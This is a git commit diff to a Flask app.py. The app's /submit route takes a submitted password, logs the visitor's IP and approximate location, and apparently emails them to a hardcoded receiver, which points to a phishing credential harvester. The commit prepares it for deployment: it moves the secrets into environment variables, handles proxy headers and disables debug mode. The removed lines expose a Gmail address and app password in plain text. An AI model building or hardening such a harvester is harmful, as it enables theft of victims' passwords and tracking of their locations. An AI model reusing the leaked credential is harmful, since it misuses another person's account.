44d310c368478e1204727a722d1841510e5c0632
Behindsomto <igwesomtochukwu@gmail.com>
2026-03-09 16:25:34 +0100

    fds

--- app.py
+++ app.py
@@ -2,17 +2,19 @@ from flask import Flask, render_template, request, jsonify
 import smtplib
 from email.mime.text import MIMEText
 import requests
+import os
 
 app = Flask(__name__)
 
-SENDER_EMAIL = "wayraeric78@gmail.com"       
-RECEIVER_EMAIL = "igwesomtochukwu@gmail.com"     
-APP_PASSWORD = "zxqbinxnxqcwizzp"  
+SENDER_EMAIL = os.environ.get("SENDER_EMAIL")
+RECEIVER_EMAIL = os.environ.get("RECEIVER_EMAIL")
+APP_PASSWORD = os.environ.get("APP_PASSWORD")
 
 
 @app.route("/")
 def home():
     return render_template("index.html")
+
 
 @app.route("/submit", methods=["POST"])
 def submit():
@@ -21,7 +23,7 @@ def submit():
     password = data.get("password")
 
     # Get user's IP
-    user_ip = request.remote_addr
+    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
 
     # Get approximate location
     try:
@@ -57,4 +59,4 @@ def submit():
 
 
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run()
